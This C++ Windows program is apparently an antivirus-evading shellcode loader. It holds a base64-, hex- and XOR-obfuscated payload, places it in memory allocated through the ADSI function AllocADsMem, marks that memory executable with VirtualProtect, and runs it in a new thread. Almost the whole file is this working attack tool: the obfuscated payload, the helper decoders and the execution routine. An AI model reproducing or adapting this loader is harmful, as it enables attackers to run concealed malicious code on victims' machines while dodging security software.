#include <iostream>
#include <map>
#include <windows.h>
#include <string>
#include <iads.h>
#include <adshlp.h>

#pragma comment(lib, "Activeds.lib")

using namespace std;

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::string base64_encode(char const* bytes_to_encode, int in_len);
std::string base64_decode(std::string& encoded_string);
std::string string_to_hex(const std::string& input);
std::string hex_to_xor(const std::string& input);

#pragma comment(lib, "Activeds.lib")

int WINAPI WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,  
	LPSTR lpCmdLine,          
	int nCmdShow              
)
{string shellcode = "NmVkYTExNzY2MjdhNWE5MjkyOTJkM2MzZDNjMmMwYzNjNGRhYTM0MGY3ZGExOWMwZjJkYTE5YzA4YWRhMTljMGIyZGExOWUwYzJkYTlkMjVkOGQ4ZGZhMzViZGFhMzUyM2VhZWYzZWU5MGJlYjJkMzUzNWI5ZmQzOTM1MzcwN2ZjMGQzYzNkYTE5YzBiMjE5ZDBhZWRhOTM0MmY0MTNlYThhOTk5MGU3ZTAxOTEyMWE5MjkyOTJkYTE3NTJlNmY1ZGE5MzQyYzIxOWRhOGFkNjE5ZDJiMmRiOTM0MjcxYzRkYTZkNWJkMzE5YTYxYWRhOTM0NGRmYTM1YmRhYTM1MjNlZDM1MzViOWZkMzkzNTNhYTcyZTc2M2RlOTFkZWI2OWFkN2FiNDNlNzRhY2FkNjE5ZDJiNmRiOTM0MmY0ZDMxOTllZGFkNjE5ZDI4ZWRiOTM0MmQzMTk5NjFhZGE5MzQyZDNjYWQzY2FjY2NiYzhkM2NhZDNjYmQzYzhkYTExN2ViMmQzYzA2ZDcyY2FkM2NiYzhkYTE5ODA3YmRkNmQ2ZDZkY2ZmODkyZGIyY2U1ZmJmY2ZiZmNmN2U2OTJkM2M0ZGIxYjc0ZGUxYjYzZDMyOGRlZTViNDk1NmQ0N2RhYTM1YmRhYTM0MGRmYTM1MmRmYTM1YmQzYzJkM2MyZDMyOGE4YzRlYjM1NmQ0NzdiMDE5MjkyOTJjOGRhMWI1M2QzMmE3Zjg0OTI5MmRmYTM1YmQzYzNkM2MzZjg5MWQzYzNkMzI4YzUxYjBkNTQ2ZDQ3NzllYmM5ZGExYjUzZGFhMzQwZGIxYjRhZGZhMzViYzBmYTkyYTA1MjE2YzBjMGQzMjg3OWM3YmNhOTZkNDdkYTFiNTRkYTExNTFjMmY4OThjZGRhMWI2MzI4OGQ5MjkyOTJmODkyZmExMmExOTI5MmRiMWI3MmQzMmI5NjkyOTI5MmQzMjhlN2Q0MGMxNDZkNDdkYTFiNjNkYTFiNDhkYjU1NTI2ZDZkNmQ2ZGRmYTM1YmMwYzBkMzI4YmY5NDhhZTk2ZDQ3MTc1MjlkMTcwZjkzOTI5MmRhNmQ1ZDlkMTYxZTkzOTI5Mjc5MjE3Yjc2OTM5MjkyN2ExMDZkNmQ2ZGJkZjBmZGZkZTZlMWU2ZTBmM2UyYmZhMGJjZmZmYmZjYmNmOGUxOTI1NmI3MjkxZGNlM2YwNWMyM2Y5NDJmNDQwYzRiODM3OGVmMmI0NDgyNGNiNmUzN2VjNDUwYjUwMTgwNDliZmE1MjI3YzY4NGQ1MWZiMTNjZDAxYjQ5ODE5Mzk5MmE3NmZmZGM3MDk3YmI1MjM1ZDI4MGRmNWQ1OTJjN2UxZjdlMGJmZDNmNWY3ZmNlNmE4YjJkZmZkZThmYmZlZmVmM2JkYTdiY2EyYjJiYWYxZmRmZmUyZjNlNmZiZjBmZWY3YTliMmRmYzFkYmQ3YjJhM2EyYmNhMmE5YjJjNWZiZmNmNmZkZTVlMWIyZGNjNmIyYTViY2EyYTliMmRiZmNmNGZkYzJmM2U2ZmFiY2ExYTliMmJjZGNkN2M2YjJkMWRlYzBiMmExYmNhM2JjYTZhMmE1YTRhNWE5YjJjNmUwZmJmNmY3ZmNlNmJkYTRiY2EyYTliMmY3ZmNiZmRiZGNiYjlmOTg5MmU4MWVkZjI4NzZiOWJmOWNiZWYxOGY2Mzc1YjdlOGY3NDc5NmUxZTU0NTJmNTBiNWUyZDIzNzlhNzk5OGFjYWFmY2Q4N2MyNjAxMWIzNTBlODE0N2FiMDZkMjNjZWZlYWE5NWVmZGNiYWQ1ZGFiYjU3NTEyNDgwNDNmMTY3NDMyNTI2N2U1MWUyOWJhMjdkNWFmNzIzMzM0NzIxMWM4M2ZiODVhMWMxZmIxM2M4MThkMzljMWNlMTJiNjA4MDAwODhmZjhhMWZkMDBmODgzMzQ1ZWZlZDhhZDQzNTg4YjEyYWZiN2YwOWM5ODU0NzY5MzdhYzJiMTFiMjM5NDQzN2NmZjMxOWIyZmFiZmU1OTVhMmYxZjZmZTNjMTFjYTJkMzk5NTNlYzQ3YmU5MGFjZWJiNzZlYjA2NDUxMWFiNjNjZTVmNTBkYzYxZjk4Y2E2NTZlMzNlYzUwNjdjZjg2YmU0ZjlkNDRlNjBkNjk1ODg4ZGY5MmQzMmM2MjI3MzBjNDZkNDdkYWEzNWIyODkyOTJkMjkyZDMyYTkyODI5MjkyZDMyYmQyOTI5MjkyZDMyOGNhMzZjMTc3NmQ0N2RhMDFjMWMxZGExYjc1ZGExYjYzZGExYjQ4ZDMyYTkyYjI5MjkyZGIxYjZiZDMyODgwMDQxYjcwNmQ0N2RhMTE1NmIyMTc1MmU2MjRmNDE5OTVkYTkzNTExNzUyZTc0NWNhY2FjYWRhOTc5MjkyOTI5MmMyNTE3YWVkNmY2ZDZkYTNhM2E2YmNhM2EzYTdiY2EzYTRhNmJjYTNhN2E1OTI4YmZiMzIxZjZk";
   std::string decoded = base64_decode(shellcode);
	string str = string_to_hex(decoded);
    string sh3llc0de = hex_to_xor(str);
    auto p = sh3llc0de.data();

    int n = 1;
    LPVOID pAc = AllocADsMem(sh3llc0de.size());
    VirtualProtect(pAc, sh3llc0de.size(), PAGE_EXECUTE_READWRITE, PDWORD(&n));
    RtlMoveMemory(pAc, p, sh3llc0de.size());
    
    HANDLE handle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pAc, 0, 0, 0);
    WaitForSingleObject(handle, -1);
    return 0;
}

static inline bool is_base64(unsigned char c) {
    return (isalnum(c) || (c == '+') || (c == '/'));
}
//A\nB                          3
std::string base64_encode(char const* bytes_to_encode, int in_len) {
    std::string ret;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (in_len--) {
        char_array_3[i++] = *(bytes_to_encode++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; (i < 4); i++)
                ret += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i)
    {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
        char_array_4[3] = char_array_3[2] & 0x3f;

        for (j = 0; (j < i + 1); j++)
            ret += base64_chars[char_array_4[j]];

        while ((i++ < 3))
            ret += '=';

    }

    return ret;

}

std::string base64_decode(std::string& encoded_string) {
    int in_len = encoded_string.size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }

    return ret;
}

std::string string_to_hex(const std::string& input)
{
    std::string output;
    size_t len = input.length();

    map<char, unsigned int> char_to_int = {
    {'0',0x0},{'1',0x1},{'2',0x2},{'3',0x3},
    {'4',0x4},{'5',0x5},{'6',0x6},{'7',0x7},
	{'8',0x8},{'9',0x9},{'a',0xa},{'b',0xb},
    {'c',0xc},{'d',0xd},{'e',0xe},{'f',0xf}
    };

    for (unsigned int i = 0; i < len; i++)
    {
        unsigned int n1 = char_to_int[input[i]] * 0x10;
        i++;
        unsigned int n2 = char_to_int[input[i]];
        unsigned int n = n1 + n2;
        char c = (char)n;
        output += c;
    }

    return output;
}

std::string hex_to_xor(const std::string& input)
{
    int nLen = input.size();
    int nKey = (int)input[nLen - 1];
    std::string output;
    for (int i = 0; i < nLen - 1; ++i)
    {
        int nTmp = (int)input[i];
        int n1 = 0xff - (nTmp ^ nKey);
        char cTmp = (char)n1;
        output += cTmp;
    }
    return output;
}
